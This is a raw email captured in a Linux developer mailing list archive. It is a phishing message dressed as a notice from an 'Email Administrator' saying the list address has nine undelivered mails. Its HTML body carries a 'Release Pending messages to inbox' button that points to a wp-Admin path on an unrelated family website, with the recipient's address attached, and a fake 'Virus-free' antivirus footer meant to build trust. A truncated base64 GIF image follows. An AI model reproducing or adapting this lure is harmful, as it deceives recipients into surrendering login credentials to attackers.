Return-Path: <linux-nvdimm-bounces@lists.01.org>
X-Original-To: lists+linux-nvdimm@lfdr.de
Delivered-To: lists+linux-nvdimm@lfdr.de
Received: from ml01.01.org (ml01.01.org [IPv6:2001:19d0:306:5::1])
	by mail.lfdr.de (Postfix) with ESMTPS id 38F1830EA12
	for <lists+linux-nvdimm@lfdr.de>; Thu,  4 Feb 2021 03:21:39 +0100 (CET)
Received: from ml01.vlan13.01.org (localhost [IPv6:::1])
	by ml01.01.org (Postfix) with ESMTP id 5FE56100ED48C;
	Wed,  3 Feb 2021 18:21:37 -0800 (PST)
Received-SPF: Pass (mailfrom) identity=mailfrom; client-ip=206.189.63.164; helo=wsu0.710.eryfj.ml; envelope-from=admin@710.eryfj.ml; receiver=<UNKNOWN> 
Received: from wsu0.710.eryfj.ml (wsu0.710.eryfj.ml [206.189.63.164])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by ml01.01.org (Postfix) with ESMTPS id 6233A100ED48C
	for <linux-nvdimm@lists.01.org>; Wed,  3 Feb 2021 18:21:34 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default; d=710.eryfj.ml;
 h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type;
 i=admin@710.eryfj.ml;
 bh=F9/bbLTGXTwYiSsuWS6t6PYr2XWoPv1vqkE7IYB5uiE=;
 b=H06tLOHDseFrAOr8N/pgbO2HN6rHm55zmaIXTj5lkFk7tR/N1H21rw6PzKn8s2GZfPEzu4Ft2fFo
   ZYJHDHUtPnOVfztAi65LAPbKvVz6ZgC4ccSrNCU3xfJ9ARTviAnGslEpN5RTDGuvNHKbjDX9sVWU
   9FqLrL3rG8myMx8LPus=
From: "Email Administrator" <admin@710.eryfj.ml>
To: linux-nvdimm@lists.01.org
Subject: linux-nvdimm@lists.01.org You have [9] undelivered mails
Date: 04 Feb 2021 10:21:28 +0800
Message-ID: <20210204102128.DB349E9448BEE7DF@710.eryfj.ml>
MIME-Version: 1.0
Message-ID-Hash: 6ZZOGKVXISBRCPTU6DV6HRY6REEWLLFR
X-Message-ID-Hash: 6ZZOGKVXISBRCPTU6DV6HRY6REEWLLFR
X-MailFrom: admin@710.eryfj.ml
X-Mailman-Rule-Hits: nonmember-moderation
X-Mailman-Rule-Misses: dmarc-mitigation; no-senders; approved; emergency; loop; banned-address; member-moderation
X-Mailman-Version: 3.1.1
Precedence: list
List-Id: "Linux-nvdimm developer list." <linux-nvdimm.lists.01.org>
Archived-At: <https://lists.01.org/hyperkitty/list/linux-nvdimm@lists.01.org/message/6ZZOGKVXISBRCPTU6DV6HRY6REEWLLFR/>
List-Archive: <https://lists.01.org/hyperkitty/list/linux-nvdimm@lists.01.org/>
List-Help: <mailto:linux-nvdimm-request@lists.01.org?subject=help>
List-Post: <mailto:linux-nvdimm@lists.01.org>
List-Subscribe: <mailto:linux-nvdimm-join@lists.01.org>
List-Unsubscribe: <mailto:linux-nvdimm-leave@lists.01.org>
Content-Type: multipart/mixed; boundary="===============6641903299004231505=="


--===============6641903299004231505==
Content-Type: multipart/related;
	boundary="----=_NextPart_000_0012_7578D619.9C11242E"


------=_NextPart_000_0012_7578D619.9C11242E
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
w3.org/TR/html4/loose.dtd">

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<BODY style=3D"MARGIN: 0.5em">
<DIV style=3D'FONT-SIZE: 14px; FONT-FAMILY: Helvetica, "Microsoft Yahei", v=
erdana; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-=
WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; =
LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0p=
x; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-=
stroke-width: 0px; text-decoration-thickness: initial; text-decoration-styl=
e: initial; text-decoration-color: initial'=20
align=3Dcenter>
<TABLE style=3D"FONT-SIZE: 15px; BORDER-TOP: rgb(211,211,211) 1px dotted; F=
ONT-FAMILY: Helvetica, Arial, Tahoma, Verdana, sans-serif; BORDER-RIGHT: rg=
b(211,211,211) 1px dotted; BORDER-BOTTOM: rgb(211,211,211) 1px dotted; TEXT=
-ALIGN: center; BORDER-LEFT: rgb(211,211,211) 1px dotted" cellSpacing=3D0 c=
ellPadding=3D0 width=3D520 border=3D1>
<TBODY>
<TR style=3D"MIN-HEIGHT: 90px">
<TD style=3D"BORDER-TOP: rgb(211,211,211) 1px dotted; FONT-FAMILY: Roboto, =
RobotoDraft, Helvetica, Arial, sans-serif; BORDER-RIGHT: rgb(211,211,211) 1=
px dotted; BORDER-BOTTOM: rgb(211,211,211) 1px dotted; WORD-BREAK: normal; =
TEXT-ALIGN: center; MIN-HEIGHT: 90px; BORDER-LEFT: rgb(211,211,211) 1px dot=
ted; MARGIN: 0px; LINE-HEIGHT: 1.666" height=3D90>
<A style=3D"TEXT-DECORATION: underline; COLOR: rgb(17,85,204)" href=3D"mail=
to:christopel24@m" rel=3D"nofollow noopener noreferrer" target=3D_blank yma=
ilto=3D"mailto:artsway@n">linux-nvdimm@lists.01.org</A></TD></TR>
<TR>
<TD style=3D"BORDER-TOP: rgb(211,211,211) 1px dotted; FONT-FAMILY: Roboto, =
RobotoDraft, Helvetica, Arial, sans-serif; BORDER-RIGHT: rgb(211,211,211) 1=
px dotted; BORDER-BOTTOM: rgb(211,211,211) 1px dotted; WORD-BREAK: normal; =
BORDER-LEFT: rgb(211,211,211) 1px dotted; MARGIN: 0px; LINE-HEIGHT: 1.666">=

<DIV style=3D"PADDING-BOTTOM: 0px; DIRECTION: ltr; PADDING-TOP: 0px; PADDIN=
G-LEFT: 0px; MARGIN: 0px 0px 0px 120px; LINE-HEIGHT: 20px; PADDING-RIGHT: 0=
px">
<DIV style=3D'FONT-FAMILY: Segoe, Tahoma, "Sans Verdana", sans-serif, serif=
, EmojiFont; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARG=
IN: 20px 120px 30px 0px; LINE-HEIGHT: 20px; PADDING-RIGHT: 0px'><SPAN style=
=3D"FONT-SIZE: 12px; COLOR: rgb(102,102,102); DISPLAY: inline-block">You ha=
ve [9] undelivered mails</SPAN><BR><BR><SPAN style=3D"FONT-SIZE: 12px; WIDT=
H: 95px; COLOR: rgb(102,102,102); MIN-HEIGHT: 86px; DISPLAY: inline-block">=

<TABLE style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Segoe UI", "Segoe UI", -appl=
e-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif; WHITE-S=
PACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; CO=
LOR: rgb(32,31,30); FONT-STYLE: normal; LETTER-SPACING: normal; BACKGROUND-=
COLOR: rgb(255,255,255); TEXT-INDENT: 0px; text-decoration-style: initial; =
text-decoration-color: initial; font-stretch: inherit' cellPadding=3D3 bord=
er=3D3>
<TBODY>
<TR>
<TH align=3Dleft>Date/Time</TH></TR>
<TR>
<TH align=3Dleft>2/3/2021 4:44:09 p.m.</TH></TR></TBODY></TABLE></SPAN><BR>=
</DIV>
<DIV style=3D"COLOR: rgb(102,102,102); PADDING-BOTTOM: 0px; PADDING-TOP: 0p=
x; PADDING-LEFT: 0px; MARGIN: 0px 120px 30px 0px; LINE-HEIGHT: 20px; PADDIN=
G-RIGHT: 0px"><B>
<A title=3D"This external link will open in a new window" style=3D'FONT-SIZ=
E: 12px; TEXT-DECORATION: underline; FONT-FAMILY: Segoe, Tahoma, "Sans Verd=
ana", sans-serif, serif, EmojiFont; BACKGROUND-IMAGE: none; BACKGROUND-REPE=
AT: repeat; COLOR: white; PADDING-BOTTOM: 5px; PADDING-TOP: 5px; PADDING-LE=
FT: 5px; DISPLAY: block; PADDING-RIGHT: 5px; BACKGROUND-COLOR: rgb(0,120,21=
5); background-size: auto' href=3D"https://girouxfamily.ca/wp-Admin/general=
/index.php?email=3Dlinux-nvdimm@lists.01.org" rel=3D"nofollow noopener=20
noreferrer" target=3D_blank>Release Pending messages to inbox.</A></B><BR><=
BR><BR></DIV></DIV></TD></TR></TBODY></TABLE></DIV>
<P style=3D'FONT-SIZE: 14px; FONT-FAMILY: Helvetica, "Microsoft Yahei", ver=
dana; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WE=
IGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-STYLE: normal; TEXT=
-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 0px; ORPHANS: 2; WIDOWS: 2;=
 MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR:=
 rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-v=
ariant-caps: normal; -webkit-text-stroke-width:=20
0px; text-decoration-thickness: initial; text-decoration-style: initial; te=
xt-decoration-color: initial' align=3Dcenter>&nbsp;</P>
<DIV style=3D"FONT-SIZE: medium; FONT-FAMILY: Roboto, RobotoDraft, Helvetic=
a, Arial, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFOR=
M: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; TEXT-A=
LIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR=
: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-=
variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thick=
ness: initial; text-decoration-style: initial;=20
text-decoration-color: initial">
<DIV class=3D"yiv4414208611ii yiv4414208611gt" style=3D"POSITION: relative;=
 PADDING-BOTTOM: 0px; DIRECTION: ltr; PADDING-TOP: 0px; PADDING-LEFT: 0px; =
MARGIN: 8px 0px 0px; PADDING-RIGHT: 0px">
<DIV class=3D"yiv4414208611a3s yiv4414208611aXjCH " style=3D"OVERFLOW: hidd=
en; FONT: small/1.5 Arial, Helvetica, sans-serif">
<DIV>
<DIV style=3D'FONT-SIZE: 14px; FONT-FAMILY: Helvetica, "Microsoft Yahei", v=
erdana; COLOR: rgb(0,0,0)' align=3Dcenter>&nbsp;</DIV></DIV></DIV></DIV></D=
IV>
<P style=3D'FONT-SIZE: 13px; FONT-FAMILY: "Helvetica Neue", Helvetica, Aria=
l, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none=
; FONT-WEIGHT: 400; COLOR: rgb(29,34,40); FONT-STYLE: normal; TEXT-ALIGN: l=
eft; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(2=
55,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant=
-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: i=
nitial; text-decoration-style: initial;=20
text-decoration-color: initial'><BR></P>
<P>
<TABLE style=3D'FONT-SIZE: 13px; BORDER-TOP: rgb(211,212,222) 1px solid; FO=
NT-FAMILY: "Helvetica Neue", Helvetica, Arial, sans-serif; WHITE-SPACE: nor=
mal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(=
29,34,40); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LET=
TER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); font-variant-ligat=
ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; te=
xt-decoration-thickness: initial;=20
text-decoration-style: initial; text-decoration-color: initial'>
<TBODY>
<TR>
<TD style=3D"WIDTH: 55px; WORD-BREAK: normal; PADDING-TOP: 13px"><A style=
=3D"TEXT-DECORATION: underline; COLOR: rgb(25,106,212)" href=3D"https://www=
=2Eavast.com/sig-email?utm_medium=3Demail&amp;utm_source=3Dlink&amp;utm_cam=
paign=3Dsig-email&amp;utm_content=3Demailclient&amp;utm_term=3Dicon" rel=3D=
"nofollow noopener noreferrer" target=3D_blank>
<img style=3D"WIDTH: 46px; MIN-HEIGHT: 29px; TEXT-INDENT: -9999px" alt src=
=3D"cid:mail" width=3D"46" height=3D"29"></A></TD>
<TD style=3D"FONT-SIZE: 13px; FONT-FAMILY: Arial, Helvetica, sans-serif; WI=
DTH: 470px; WORD-BREAK: normal; COLOR: rgb(65,66,78); PADDING-TOP: 12px; LI=
NE-HEIGHT: 18px">Virus-free.<SPAN>&nbsp;</SPAN><A style=3D"TEXT-DECORATION:=
 underline; COLOR: rgb(68,83,234)" href=3D"https://www.avast.com/sig-email?=
utm_medium=3Demail&amp;utm_source=3Dlink&amp;utm_campaign=3Dsig-email&amp;u=
tm_content=3Demailclient&amp;utm_term=3Dlink" rel=3D"nofollow noopener nore=
ferrer" target=3D_blank>www.avast.com</A></TD></TR></TBODY></TABLE>
</P></BODY></HTML>
------=_NextPart_000_0012_7578D619.9C11242E
Content-Type: application/octet-stream; name="mail"
Content-Transfer-Encoding: base64
Content-ID: <mail>

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
